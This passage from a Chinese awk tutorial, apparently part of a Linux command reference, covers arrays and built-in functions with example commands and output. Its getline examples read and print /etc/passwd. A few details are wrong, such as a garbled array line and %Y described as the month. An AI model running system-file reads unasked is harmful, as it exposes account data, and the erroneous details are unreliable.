id=\"其他语句\">其他语句</h3>\n<ul>\n<li><strong>break</strong>  当 break 语句用于 while 或 for 语句时，导致退出程序循环。</li>\n<li><strong>continue</strong>  当 continue 语句用于 while 或 for 语句时，使程序循环移动到下一个迭代。</li>\n<li><strong>next</strong>  能能够导致读入下一个输入行，并返回到脚本的顶部。这可以避免对当前输入行执行其他的操作过程。</li>\n<li><strong>exit</strong>  语句使主输入循环退出并将控制转移到END,如果END存在的话。如果没有定义END规则，或在END中应用exit语句，则终止脚本的执行。</li>\n</ul>\n<h2 id=\"数组应用\">数组应用</h2>\n<p>数组是awk的灵魂，处理文本中最不能少的就是它的数组处理。因为数组索引（下标）可以是数字和字符串在awk中数组叫做关联数组(associative arrays)。awk 中的数组不必提前声明，也不必声明大小。数组元素用0或空字符串来初始化，这根据上下文而定。</p>\n<h3 id=\"数组的定义\">数组的定义</h3>\n<p>数字做数组索引（下标）：</p>\n<pre><code class=\"language-shell\">Array[<span class=\"hljs-number\">1</span>]<span class=\"hljs-operator\">=</span><span class=\"hljs-string\">\"sun\"</span>\nArray[<span class=\"hljs-number\">2</span>]<span class=\"hljs-operator\">=</span><span class=\"hljs-string\">\"kai\"</span>\n</code></pre>\n<p>字符串做数组索引（下标）：</p>\n<pre><code class=\"language-shell\">Array[<span class=\"hljs-string\">\"first\"</span>]<span class=\"hljs-operator\">=</span><span class=\"hljs-string\">\"www\"</span>\nArray<span class=\"hljs-string\">\"[last\"</span>]<span class=\"hljs-operator\">=</span><span class=\"hljs-string\">\"name\"</span>\nArray[<span class=\"hljs-string\">\"birth\"</span>]<span class=\"hljs-operator\">=</span><span class=\"hljs-string\">\"1987\"</span>\n</code></pre>\n<p>使用中<code>print Array[1]</code>会打印出sun；使用<code>print Array[2]</code>会打印出kai；使用<code>print[\"birth\"]</code>会得到1987。</p>\n<p> <strong>读取数组的值</strong> </p>\n<pre><code class=\"language-shell\">{ <span class=\"hljs-keyword\">for</span>(item <span class=\"hljs-keyword\">in</span> <span class=\"hljs-keyword\">array</span>) {<span class=\"hljs-keyword\">print</span> <span class=\"hljs-keyword\">array</span>[item]}; }       <span class=\"hljs-comment\">#输出的顺序是随机的</span>\n{ <span class=\"hljs-keyword\">for</span>(i=<span class=\"hljs-number\">1</span>;i&lt;=len;i++) {<span class=\"hljs-keyword\">print</span> <span class=\"hljs-keyword\">array</span>[i]}; }         <span class=\"hljs-comment\">#Len是数组的长度</span>\n</code></pre>\n<h3 id=\"数组相关函数\">数组相关函数</h3>\n<p><strong>得到数组长度：</strong> </p>\n<pre><code class=\"language-shell\">awk 'BEGIN{info=<span class=\"hljs-string\">\"it is a test\"</span>;lens=<span class=\"hljs-keyword\">split</span>(info,<span class=\"hljs-keyword\">tA</span>,<span class=\"hljs-string\">\" \"</span>);<span class=\"hljs-keyword\">print</span> <span class=\"hljs-built_in\">length</span>(<span class=\"hljs-keyword\">tA</span>),lens;}'\n4 4\n</code></pre>\n<p>length返回字符串以及数组长度，split进行分割字符串为数组，也会返回分割得到数组长度。</p>\n<pre><code class=\"language-shell\">awk 'BEGIN{info=<span class=\"hljs-string\">\"it is a test\"</span>;<span class=\"hljs-keyword\">split</span>(info,<span class=\"hljs-keyword\">tA</span>,<span class=\"hljs-string\">\" \"</span>);<span class=\"hljs-keyword\">print</span> asort(<span class=\"hljs-keyword\">tA</span>);}'\n4\n</code></pre>\n<p>asort对数组进行排序，返回数组长度。</p>\n<p><strong>输出数组内容（无序，有序输出）：</strong> </p>\n<pre><code class=\"language-shell\">awk 'BEGIN{info=<span class=\"hljs-string\">\"it is a test\"</span>;<span class=\"hljs-keyword\">split</span>(info,<span class=\"hljs-keyword\">tA</span>,<span class=\"hljs-string\">\" \"</span>);<span class=\"hljs-keyword\">for</span>(k <span class=\"hljs-keyword\">in</span> <span class=\"hljs-keyword\">tA</span>){<span class=\"hljs-keyword\">print</span> k,<span class=\"hljs-keyword\">tA</span>[k];}}'\n4 <span class=\"hljs-keyword\">test</span>\n1 it\n2 is\n3 a \n</code></pre>\n<p><code>for…in</code>输出，因为数组是关联数组，默认是无序的。所以通过<code>for…in</code>得到是无序的数组。如果需要得到有序数组，需要通过下标获得。</p>\n<pre><code class=\"language-shell\">awk 'BEGIN{info=<span class=\"hljs-string\">\"it is a test\"</span>;tlen=<span class=\"hljs-keyword\">split</span>(info,<span class=\"hljs-keyword\">tA</span>,<span class=\"hljs-string\">\" \"</span>);<span class=\"hljs-keyword\">for</span>(k=1;k&lt;=tlen;k++){<span class=\"hljs-keyword\">print</span> k,<span class=\"hljs-keyword\">tA</span>[k];}}'\n1 it\n2 is\n3 a\n4 <span class=\"hljs-keyword\">test</span>\n</code></pre>\n<p>注意：数组下标是从1开始，与C数组不一样。</p>\n<p><strong>判断键值存在以及删除键值：</strong> </p>\n<pre><code class=\"language-shell\"><span class=\"hljs-comment\"># 错误的判断方法：</span>\nawk 'BEGIN{tB[<span class=\"hljs-string\">\"a\"</span>]=<span class=\"hljs-string\">\"a1\"</span>;tB[<span class=\"hljs-string\">\"b\"</span>]=<span class=\"hljs-string\">\"b1\"</span>;<span class=\"hljs-keyword\">if</span>(tB[<span class=\"hljs-string\">\"c\"</span>]!=<span class=\"hljs-string\">\"1\"</span>){<span class=\"hljs-keyword\">print</span> <span class=\"hljs-string\">\"no found\"</span>;};<span class=\"hljs-keyword\">for</span>(k <span class=\"hljs-keyword\">in</span> tB){<span class=\"hljs-keyword\">print</span> k,tB[k];}}' \nno found\na a1\nb b1\nc\n</code></pre>\n<p>以上出现奇怪问题，<code>tB[“c”]</code>没有定义，但是循环时候，发现已经存在该键值，它的值为空，这里需要注意，awk数组是关联数组，只要通过数组引用它的key，就会自动创建改序列。</p>\n<pre><code class=\"language-shell\"><span class=\"hljs-comment\"># 正确判断方法：</span>\nawk 'BEGIN{tB[<span class=\"hljs-string\">\"a\"</span>]=<span class=\"hljs-string\">\"a1\"</span>;tB[<span class=\"hljs-string\">\"b\"</span>]=<span class=\"hljs-string\">\"b1\"</span>;<span class=\"hljs-keyword\">if</span>( <span class=\"hljs-string\">\"c\"</span> <span class=\"hljs-keyword\">in</span> tB){<span class=\"hljs-keyword\">print</span> <span class=\"hljs-string\">\"ok\"</span>;};<span class=\"hljs-keyword\">for</span>(k <span class=\"hljs-keyword\">in</span> tB){<span class=\"hljs-keyword\">print</span> k,tB[k];}}'  \na a1\nb b1\n</code></pre>\n<p><code>if(key in array)</code>通过这种方法判断数组中是否包含<code>key</code>键值。</p>\n<pre><code class=\"language-shell\"><span class=\"hljs-comment\">#删除键值：</span>\nawk 'BEGIN{tB[<span class=\"hljs-string\">\"a\"</span>]=<span class=\"hljs-string\">\"a1\"</span>;tB[<span class=\"hljs-string\">\"b\"</span>]=<span class=\"hljs-string\">\"b1\"</span>;delete tB[<span class=\"hljs-string\">\"a\"</span>];<span class=\"hljs-keyword\">for</span>(k <span class=\"hljs-keyword\">in</span> tB){<span class=\"hljs-keyword\">print</span> k,tB[k];}}'                     \nb b1\n</code></pre>\n<p><code>delete array[key]</code>可以删除，对应数组<code>key</code>的，序列值。</p>\n<h3 id=\"二维、多维数组使用\">二维、多维数组使用</h3>\n<p>awk的多维数组在本质上是一维数组，更确切一点，awk在存储上并不支持多维数组。awk提供了逻辑上模拟二维数组的访问方式。例如，<code>array[2,4]=1</code>这样的访问是允许的。awk使用一个特殊的字符串<code>SUBSEP(�34)</code>作为分割字段，在上面的例子中，关联数组array存储的键值实际上是2�344。</p>\n<p>类似一维数组的成员测试，多维数组可以使用<code>if ( (i,j) in array)</code>这样的语法，但是下标必须放置在圆括号中。类似一维数组的循环访问，多维数组使用<code>for ( item in array )</code>这样的语法遍历数组。与一维数组不同的是，多维数组必须使用<code>split()</code>函数来访问单独的下标分量。</p>\n<pre><code class=\"language-shell\">awk 'BEGIN{\nfor(i=1;i&lt;=9;i++){\n  for(j=1;j&lt;=9;j++){\n    tarr[i,j]=i*j; print i,\"*\",j,\"=\",tarr[i,j];\n  }\n}\n}'\n1 *<span class=\"hljs-number\"> 1 </span>= 1\n1 *<span class=\"hljs-number\"> 2 </span>= 2\n1 *<span class=\"hljs-number\"> 3 </span>= 3\n1 *<span class=\"hljs-number\"> 4 </span>= 4\n1 *<span class=\"hljs-number\"> 5 </span>= 5\n1 *<span class=\"hljs-number\"> 6 </span>=<span class=\"hljs-number\"> 6 </span>\n...\n9 *<span class=\"hljs-number\"> 6 </span>= 54\n9 *<span class=\"hljs-number\"> 7 </span>= 63\n9 *<span class=\"hljs-number\"> 8 </span>= 72\n9 *<span class=\"hljs-number\"> 9 </span>= 81\n</code></pre>\n<p>可以通过<code>array[k,k2]</code>引用获得数组内容。</p>\n<p>另一种方法：</p>\n<pre><code class=\"language-shell\">awk 'BEGIN{\nfor(i=1;i&lt;=9;i++){\n  for(j=1;j&lt;=9;j++){\n    tarr<span class=\"hljs-comment\">[i,j]</span>=i*j;\n  }\n}\nfor(m in tarr){\n  split(m,tarr2,SUBSEP); print tarr2<span class=\"hljs-comment\">[1]</span>,<span class=\"hljs-string\">\"*\"</span>,tarr2<span class=\"hljs-comment\">[2]</span>,<span class=\"hljs-string\">\"=\"</span>,tarr<span class=\"hljs-comment\">[m]</span>;\n}\n}'\n</code></pre>\n<h2 id=\"内置函数\">内置函数</h2>\n<p>awk内置函数，主要分以下3种类似：算数函数、字符串函数、其它一般函数、时间函数。</p>\n<h3 id=\"算术函数\">算术函数</h3>\n<table>\n<thead>\n<tr>\n<th>格式</th>\n<th>描述</th>\n</tr>\n</thead>\n<tbody><tr>\n<td>atan2( y, x )</td>\n<td>返回 y/x 的反正切。</td>\n</tr>\n<tr>\n<td>cos( x )</td>\n<td>返回 x 的余弦；x 是弧度。</td>\n</tr>\n<tr>\n<td>sin( x )</td>\n<td>返回 x 的正弦；x 是弧度。</td>\n</tr>\n<tr>\n<td>exp( x )</td>\n<td>返回 x 幂函数。</td>\n</tr>\n<tr>\n<td>log( x )</td>\n<td>返回 x 的自然对数。</td>\n</tr>\n<tr>\n<td>sqrt( x )</td>\n<td>返回 x 平方根。</td>\n</tr>\n<tr>\n<td>int( x )</td>\n<td>返回 x 的截断至整数的值。</td>\n</tr>\n<tr>\n<td>rand( )</td>\n<td>返回任意数字 n，其中 0 &lt;= n &lt; 1。</td>\n</tr>\n<tr>\n<td>srand( [expr] )</td>\n<td>将 rand 函数的种子值设置为 Expr 参数的值，或如果省略 Expr 参数则使用某天的时间。返回先前的种子值。</td>\n</tr>\n</tbody></table>\n<p>举例说明：</p>\n<pre><code class=\"language-shell\"><span class=\"hljs-attribute\">awk</span> 'BEGIN{OFMT=<span class=\"hljs-string\">\"%.3f\"</span>;fs=sin(<span class=\"hljs-number\">1</span>);fe=exp(<span class=\"hljs-number\">10</span>);fl=log(<span class=\"hljs-number\">10</span>);fi=int(<span class=\"hljs-number\">3</span>.<span class=\"hljs-number\">1415</span>);print fs,fe,fl,fi;}'\n<span class=\"hljs-attribute\">0</span>.<span class=\"hljs-number\">841</span> <span class=\"hljs-number\">22026</span>.<span class=\"hljs-number\">466</span> <span class=\"hljs-number\">2</span>.<span class=\"hljs-number\">303</span> <span class=\"hljs-number\">3</span>\n</code></pre>\n<p>OFMT 设置输出数据格式是保留3位小数。</p>\n<p>获得随机数：</p>\n<pre><code class=\"language-shell\">awk <span class=\"hljs-number\">'BE</span>GIN{srand();fr=<span class=\"hljs-keyword\">int</span>(<span class=\"hljs-number\">100</span>*<span class=\"hljs-keyword\">rand</span>());print fr;}'\n<span class=\"hljs-number\">78</span>\nawk <span class=\"hljs-number\">'BE</span>GIN{srand();fr=<span class=\"hljs-keyword\">int</span>(<span class=\"hljs-number\">100</span>*<span class=\"hljs-keyword\">rand</span>());print fr;}'\n<span class=\"hljs-number\">31</span>\nawk <span class=\"hljs-number\">'BE</span>GIN{srand();fr=<span class=\"hljs-keyword\">int</span>(<span class=\"hljs-number\">100</span>*<span class=\"hljs-keyword\">rand</span>());print fr;}'\n<span class=\"hljs-number\">41</span> \n</code></pre>\n<h3 id=\"字符串函数\">字符串函数</h3>\n<table>\n<thead>\n<tr>\n<th>格式</th>\n<th>描述</th>\n</tr>\n</thead>\n<tbody><tr>\n<td>gsub( Ere, Repl, [ In ] )</td>\n<td>除了正则表达式所有具体值被替代这点，它和 sub 函数完全一样地执行。</td>\n</tr>\n<tr>\n<td>sub( Ere, Repl, [ In ] )</td>\n<td>用 Repl 参数指定的字符串替换 In 参数指定的字符串中的由 Ere 参数指定的扩展正则表达式的第一个具体值。sub 函数返回替换的数量。出现在 Repl 参数指定的字符串中的 &amp;（和符号）由 In 参数指定的与 Ere 参数的指定的扩展正则表达式匹配的字符串替换。如果未指定 In 参数，缺省值是整个记录（$0 记录变量）。</td>\n</tr>\n<tr>\n<td>index( String1, String2 )</td>\n<td>在由 String1 参数指定的字符串（其中有出现 String2 指定的参数）中，返回位置，从 1 开始编号。如果 String2 参数不在 String1 参数中出现，则返回 0（零）。</td>\n</tr>\n<tr>\n<td>length [(String)]</td>\n<td>返回 String 参数指定的字符串的长度（字符形式）。如果未给出 String 参数，则返回整个记录的长度（$0 记录变量）。</td>\n</tr>\n<tr>\n<td>blength [(String)]</td>\n<td>返回 String 参数指定的字符串的长度（以字节为单位）。如果未给出 String 参数，则返回整个记录的长度（$0 记录变量）。</td>\n</tr>\n<tr>\n<td>substr( String, M, [ N ] )</td>\n<td>返回具有 N 参数指定的字符数量子串。子串从 String 参数指定的字符串取得，其字符以 M 参数指定的位置开始。M 参数指定为将 String 参数中的第一个字符作为编号 1。如果未指定 N 参数，则子串的长度将是 M 参数指定的位置到 String 参数的末尾 的长度。</td>\n</tr>\n<tr>\n<td>match( String, Ere )</td>\n<td>在 String 参数指定的字符串（Ere 参数指定的扩展正则表达式出现在其中）中返回位置（字符形式），从 1 开始编号，或如果 Ere 参数不出现，则返回 0（零）。RSTART 特殊变量设置为返回值。RLENGTH 特殊变量设置为匹配的字符串的长度，或如果未找到任何匹配，则设置为 -1（负一）。</td>\n</tr>\n<tr>\n<td>split( String, A, [Ere] )</td>\n<td>将 String 参数指定的参数分割为数组元素 A[1], A[2], . . ., A[n]，并返回 n 变量的值。此分隔可以通过 Ere 参数指定的扩展正则表达式进行，或用当前字段分隔符（FS 特殊变量）来进行（如果没有给出 Ere 参数）。除非上下文指明特定的元素还应具有一个数字值，否则 A 数组中的元素用字符串值来创建。</td>\n</tr>\n<tr>\n<td>tolower( String )</td>\n<td>返回 String 参数指定的字符串，字符串中每个大写字符将更改为小写。大写和小写的映射由当前语言环境的 LC_CTYPE 范畴定义。</td>\n</tr>\n<tr>\n<td>toupper( String )</td>\n<td>返回 String 参数指定的字符串，字符串中每个小写字符将更改为大写。大写和小写的映射由当前语言环境的 LC_CTYPE 范畴定义。</td>\n</tr>\n<tr>\n<td>sprintf(Format, Expr, Expr, . . . )</td>\n<td>根据 Format 参数指定的 printf 子例程格式字符串来格式化 Expr 参数指定的表达式并返回最后生成的字符串。</td>\n</tr>\n</tbody></table>\n<p>注：Ere都可以是正则表达式。</p>\n<p><strong>gsub,sub使用</strong> </p>\n<pre><code class=\"language-shell\">awk 'BEGIN{<span class=\"hljs-built_in\">info</span>=<span class=\"hljs-string\">\"this is a test2010test!\"</span>;gsub(/[<span class=\"hljs-number\">0</span>-<span class=\"hljs-number\">9</span>]+/,<span class=\"hljs-string\">\"!\"</span>,<span class=\"hljs-built_in\">info</span>);print <span class=\"hljs-built_in\">info</span>}'\nthis is a test!test!\n</code></pre>\n<p>在 info中查找满足正则表达式，<code>/[0-9]+/</code> 用<code>””</code>替换，并且替换后的值，赋值给info 未给info值，默认是<code>$0</code></p>\n<p> <strong>查找字符串（index使用）</strong> </p>\n<pre><code class=\"language-shell\">awk 'BEGIN{<span class=\"hljs-built_in\">info</span>=<span class=\"hljs-string\">\"this is a test2010test!\"</span>;print <span class=\"hljs-built_in\">index</span>(<span class=\"hljs-built_in\">info</span>,<span class=\"hljs-string\">\"test\"</span>)?<span class=\"hljs-string\">\"ok\"</span><span class=\"hljs-symbol\">:</span><span class=\"hljs-string\">\"no found\"</span>;}'\nok\n</code></pre>\n<p>未找到，返回0</p>\n<p><strong>正则表达式匹配查找(match使用）</strong> </p>\n<pre><code>awk 'BEGIN{<span class=\"hljs-built_in\">info</span>=<span class=\"hljs-string\">\"this is a test2010test!\"</span>;print <span class=\"hljs-built_in\">match</span>(<span class=\"hljs-built_in\">info</span>,/[<span class=\"hljs-number\">0</span>-<span class=\"hljs-number\">9</span>]+/)?<span class=\"hljs-string\">\"ok\"</span><span class=\"hljs-symbol\">:</span><span class=\"hljs-string\">\"no found\"</span>;}'\nok\n</code></pre>\n<p><strong>截取字符串(substr使用）</strong> </p>\n<pre><code class=\"language-shell\">[wangsl@centos5 ~]$ awk 'BEGIN{info=<span class=\"hljs-string\">\"this is a test2010test!\"</span>;<span class=\"hljs-keyword\">print</span> <span class=\"hljs-built_in\">substr</span>(info,4,10);}'\ns is a <span class=\"hljs-keyword\">tes</span>\n</code></pre>\n<p>从第 4个 字符开始，截取10个长度字符串</p>\n<p><strong>字符串分割（split使用）</strong> </p>\n<pre><code class=\"language-shell\">awk 'BEGIN{info=<span class=\"hljs-string\">\"this is a test\"</span>;<span class=\"hljs-keyword\">split</span>(info,<span class=\"hljs-keyword\">tA</span>,<span class=\"hljs-string\">\" \"</span>);<span class=\"hljs-keyword\">print</span> <span class=\"hljs-built_in\">length</span>(<span class=\"hljs-keyword\">tA</span>);<span class=\"hljs-keyword\">for</span>(k <span class=\"hljs-keyword\">in</span> <span class=\"hljs-keyword\">tA</span>){<span class=\"hljs-keyword\">print</span> k,<span class=\"hljs-keyword\">tA</span>[k];}}'\n4\n4 <span class=\"hljs-keyword\">test</span>\n1 this\n2 is\n3 a\n</code></pre>\n<p>分割info，动态创建数组tA，这里比较有意思，<code>awk for …in</code>循环，是一个无序的循环。 并不是从数组下标1…n ，因此使用时候需要注意。</p>\n<p><strong>格式化字符串输出（sprintf使用）</strong> </p>\n<p>格式化字符串格式：</p>\n<p>其中格式化字符串包括两部分内容：一部分是正常字符，这些字符将按原样输出; 另一部分是格式化规定字符，以<code>\"%\"</code>开始，后跟一个或几个规定字符,用来确定输出内容格式。</p>\n<table>\n<thead>\n<tr>\n<th>格式</th>\n<th>描述</th>\n<th>格式</th>\n<th>描述</th>\n</tr>\n</thead>\n<tbody><tr>\n<td>%d</td>\n<td>十进制有符号整数</td>\n<td>%u</td>\n<td>十进制无符号整数</td>\n</tr>\n<tr>\n<td>%f</td>\n<td>浮点数</td>\n<td>%s</td>\n<td>字符串</td>\n</tr>\n<tr>\n<td>%c</td>\n<td>单个字符</td>\n<td>%p</td>\n<td>指针的值</td>\n</tr>\n<tr>\n<td>%e</td>\n<td>指数形式的浮点数</td>\n<td>%x</td>\n<td>%X 无符号以十六进制表示的整数</td>\n</tr>\n<tr>\n<td>%o</td>\n<td>无符号以八进制表示的整数</td>\n<td>%g</td>\n<td>自动选择合适的表示法</td>\n</tr>\n</tbody></table>\n<pre><code class=\"language-shell\"><span class=\"hljs-attribute\">awk</span> 'BEGIN{n1=<span class=\"hljs-number\">124</span>.<span class=\"hljs-number\">113</span>;n2=-<span class=\"hljs-number\">1</span>.<span class=\"hljs-number\">224</span>;n3=<span class=\"hljs-number\">1</span>.<span class=\"hljs-number\">2345</span>; printf(<span class=\"hljs-string\">\"%.2f,%.2u,%.2g,%X,%on\"</span>,n1,n2,n3,n1,n1);}'\n<span class=\"hljs-attribute\">124</span>.<span class=\"hljs-number\">11</span>,<span class=\"hljs-number\">18446744073709551615</span>,<span class=\"hljs-number\">1</span>.<span class=\"hljs-number\">2</span>,<span class=\"hljs-number\">7</span>C,<span class=\"hljs-number\">174</span>\n</code></pre>\n<h3 id=\"一般函数\">一般函数</h3>\n<table>\n<thead>\n<tr>\n<th>格式</th>\n<th>描述</th>\n</tr>\n</thead>\n<tbody><tr>\n<td>close( Expression )</td>\n<td>用同一个带字符串值的 Expression 参数来关闭由 print 或 printf 语句打开的或调用 getline 函数打开的文件或管道。如果文件或管道成功关闭，则返回 0；其它情况下返回非零值。如果打算写一个文件，并稍后在同一个程序中读取文件，则 close 语句是必需的。</td>\n</tr>\n<tr>\n<td>system(command )</td>\n<td>执行 Command 参数指定的命令，并返回退出状态。等同于 system 子例程。</td>\n</tr>\n<tr>\n<td>Expression <code>|</code> getline [ Variable ]</td>\n<td>从来自 Expression 参数指定的命令的输出中通过管道传送的流中读取一个输入记录，并将该记录的值指定给 Variable 参数指定的变量。如果当前未打开将 Expression 参数的值作为其命令名称的流，则创建流。创建的流等同于调用 popen 子例程，此时 Command 参数取 Expression 参数的值且 Mode 参数设置为一个是 r 的值。只要流保留打开且 Expression 参数求得同一个字符串，则对 getline 函数的每次后续调用读取另一个记录。如果未指定 Variable 参数，则 $0 记录变量和 NF 特殊变量设置为从流读取的记录。</td>\n</tr>\n<tr>\n<td>getline [ Variable ] &lt; Expression</td>\n<td>从 Expression 参数指定的文件读取输入的下一个记录，并将 Variable 参数指定的变量设置为该记录的值。只要流保留打开且 Expression 参数对同一个字符串求值，则对 getline 函数的每次后续调用读取另一个记录。如果未指定 Variable 参数，则 $0 记录变量和 NF 特殊变量设置为从流读取的记录。</td>\n</tr>\n<tr>\n<td>getline [ Variable ]</td>\n<td>将 Variable 参数指定的变量设置为从当前输入文件读取的下一个输入记录。如果未指定 Variable 参数，则 $0 记录变量设置为该记录的值，还将设置 NF、NR 和 FNR 特殊变量。</td>\n</tr>\n</tbody></table>\n<p><strong>打开外部文件（close用法）</strong> </p>\n<pre><code class=\"language-shell\">awk <span class=\"hljs-string\">'BEGIN{while(\"cat /etc/passwd\"|getline){print $0;};close(\"/etc/passwd\");}'</span>\n<span class=\"hljs-symbol\">root:</span><span class=\"hljs-symbol\">x:</span>0<span class=\"hljs-symbol\">:</span>0<span class=\"hljs-symbol\">:root</span><span class=\"hljs-symbol\">:/root</span><span class=\"hljs-symbol\">:/bin/bash</span>\n<span class=\"hljs-symbol\">bin:</span><span class=\"hljs-symbol\">x:</span><span class=\"hljs-number\">1</span><span class=\"hljs-symbol\">:</span><span class=\"hljs-number\">1</span><span class=\"hljs-symbol\">:bin</span><span class=\"hljs-symbol\">:/bin</span><span class=\"hljs-symbol\">:/sbin/nologin</span>\n<span class=\"hljs-symbol\">daemon:</span><span class=\"hljs-symbol\">x:</span><span class=\"hljs-number\">2</span><span class=\"hljs-symbol\">:</span><span class=\"hljs-number\">2</span><span class=\"hljs-symbol\">:daemon</span><span class=\"hljs-symbol\">:/sbin</span><span class=\"hljs-symbol\">:/sbin/nologin</span>\n</code></pre>\n<p><strong>逐行读取外部文件(getline使用方法）</strong> </p>\n<pre><code class=\"language-shell\">awk <span class=\"hljs-string\">'BEGIN{while(getline &lt; \"/etc/passwd\"){print $0;};close(\"/etc/passwd\");}'</span>\n<span class=\"hljs-symbol\">root:</span><span class=\"hljs-symbol\">x:</span>0<span class=\"hljs-symbol\">:</span>0<span class=\"hljs-symbol\">:root</span><span class=\"hljs-symbol\">:/root</span><span class=\"hljs-symbol\">:/bin/bash</span>\n<span class=\"hljs-symbol\">bin:</span><span class=\"hljs-symbol\">x:</span><span class=\"hljs-number\">1</span><span class=\"hljs-symbol\">:</span><span class=\"hljs-number\">1</span><span class=\"hljs-symbol\">:bin</span><span class=\"hljs-symbol\">:/bin</span><span class=\"hljs-symbol\">:/sbin/nologin</span>\n<span class=\"hljs-symbol\">daemon:</span><span class=\"hljs-symbol\">x:</span><span class=\"hljs-number\">2</span><span class=\"hljs-symbol\">:</span><span class=\"hljs-number\">2</span><span class=\"hljs-symbol\">:daemon</span><span class=\"hljs-symbol\">:/sbin</span><span class=\"hljs-symbol\">:/sbin/nologin</span>\n</code></pre>\n<pre><code class=\"language-shell\">awk 'BEGIN{print <span class=\"hljs-string\">\"Enter your name:\"</span>;getline <span class=\"hljs-built_in\">name</span>;print <span class=\"hljs-built_in\">name</span>;}'\nEnter your <span class=\"hljs-built_in\">name</span>:\nchengmo\nchengmo\n</code></pre>\n<p><strong>调用外部应用程序(system使用方法）</strong> </p>\n<pre><code class=\"language-shell\"><span class=\"hljs-attribute\">awk</span> 'BEGIN{b=system(<span class=\"hljs-string\">\"ls -al\"</span>);print b;}'\n<span class=\"hljs-attribute\">total</span> <span class=\"hljs-number\">42092</span>\n<span class=\"hljs-attribute\">drwxr</span>-xr-x <span class=\"hljs-number\">14</span> chengmo chengmo     <span class=\"hljs-number\">4096</span> <span class=\"hljs-number\">09</span>-<span class=\"hljs-number\">30</span> <span class=\"hljs-number\">17</span>:<span class=\"hljs-number\">47</span> .\n<span class=\"hljs-attribute\">drwxr</span>-xr-x <span class=\"hljs-number\">95</span> root   root       <span class=\"hljs-number\">4096</span> <span class=\"hljs-number\">10</span>-<span class=\"hljs-number\">08</span> <span class=\"hljs-number\">14</span>:<span class=\"hljs-number\">01</span> ..\n</code></pre>\n<p>b返回值，是执行结果。</p>\n<h3 id=\"时间函数\">时间函数</h3>\n<table>\n<thead>\n<tr>\n<th>格式</th>\n<th>描述</th>\n</tr>\n</thead>\n<tbody><tr>\n<td>函数名</td>\n<td>说明</td>\n</tr>\n<tr>\n<td>mktime( YYYY MM dd HH MM ss[ DST])</td>\n<td>生成时间格式</td>\n</tr>\n<tr>\n<td>strftime([format [, timestamp]])</td>\n<td>格式化时间输出，将时间戳转为时间字符串具体格式，见下表。</td>\n</tr>\n<tr>\n<td>systime()</td>\n<td>得到时间戳，返回从1970年1月1日开始到当前时间(不计闰年)的整秒数</td>\n</tr>\n</tbody></table>\n<p><strong>建指定时间(mktime使用）</strong> </p>\n<pre><code class=\"language-shell\"><span class=\"hljs-attribute\">awk</span> 'BEGIN{tstamp=mktime(<span class=\"hljs-string\">\"2001 01 01 12 12 12\"</span>);print strftime(<span class=\"hljs-string\">\"%c\"</span>,tstamp);}'\n<span class=\"hljs-attribute\">2001</span>年<span class=\"hljs-number\">01</span>月<span class=\"hljs-number\">01</span>日 星期一 <span class=\"hljs-number\">12</span>时<span class=\"hljs-number\">12</span>分<span class=\"hljs-number\">12</span>秒\n</code></pre>\n<pre><code class=\"language-shell\">awk 'BEGIN{tstamp1=mktime(<span class=\"hljs-string\">\"2001 01 01 12 12 12\"</span>);tstamp2=mktime(<span class=\"hljs-string\">\"2001 02 01 0 0 0\"</span>);print tstamp2-tstamp1;}'\n2634468\n</code></pre>\n<p>求2个时间段中间时间差，介绍了strftime使用方法</p>\n<pre><code class=\"language-shell\">awk 'BEGIN{tstamp1=mktime(<span class=\"hljs-string\">\"2001 01 01 12 12 12\"</span>);tstamp2=systime();print tstamp2-tstamp1;}' \n308201392\n</code></pre>\n<p><strong>strftime日期和时间格式说明符</strong> </p>\n<table>\n<thead>\n<tr>\n<th>格式</th>\n<th>描述</th>\n</tr>\n</thead>\n<tbody><tr>\n<td>%a</td>\n<td>星期几的缩写(Sun)</td>\n</tr>\n<tr>\n<td>%A</td>\n<td>星期几的完整写法(Sunday)</td>\n</tr>\n<tr>\n<td>%b</td>\n<td>月名的缩写(Oct)</td>\n</tr>\n<tr>\n<td>%B</td>\n<td>月名的完整写法(October)</td>\n</tr>\n<tr>\n<td>%c</td>\n<td>本地日期和时间</td>\n</tr>\n<tr>\n<td>%d</td>\n<td>十进制日期</td>\n</tr>\n<tr>\n<td>%D</td>\n<td>日期 08/20/99</td>\n</tr>\n<tr>\n<td>%e</td>\n<td>日期，如果只有一位会补上一个空格</td>\n</tr>\n<tr>\n<td>%H</td>\n<td>用十进制表示24小时格式的小时</td>\n</tr>\n<tr>\n<td>%I</td>\n<td>用十进制表示12小时格式的小时</td>\n</tr>\n<tr>\n<td>%j</td>\n<td>从1月1日起一年中的第几天</td>\n</tr>\n<tr>\n<td>%m</td>\n<td>十进制表示的月份</td>\n</tr>\n<tr>\n<td>%M</td>\n<td>十进制表示的分钟</td>\n</tr>\n<tr>\n<td>%p</td>\n<td>12小时表示法(AM/PM)</td>\n</tr>\n<tr>\n<td>%S</td>\n<td>十进制表示的秒</td>\n</tr>\n<tr>\n<td>%U</td>\n<td>十进制表示的一年中的第几个星期(星期天作为一个星期的开始)</td>\n</tr>\n<tr>\n<td>%w</td>\n<td>十进制表示的星期几(星期天是0)</td>\n</tr>\n<tr>\n<td>%W</td>\n<td>十进制表示的一年中的第几个星期(星期一作为一个星期的开始)</td>\n</tr>\n<tr>\n<td>%x</td>\n<td>重新设置本地日期(08/20/99)</td>\n</tr>\n<tr>\n<td>%X</td>\n<td>重新设置本地时间(12:00:00)</td>\n</tr>\n<tr>\n<td>%y</td>\n<td>两位数字表示的年(99)</td>\n</tr>\n<tr>\n<td>%Y</td>\n<td>当前月份</td>\n</tr>\n<tr>\n<td>%%</td>\n<td>百分号(%)</td>\n</tr>\n</tbody></table>\n<!-- Linux命令行搜索引擎：https://jaywcjlove.github.io/linux-command/ -->\n"
    },
    {
        "title": "axel",
        "des": "多线程下载工具",
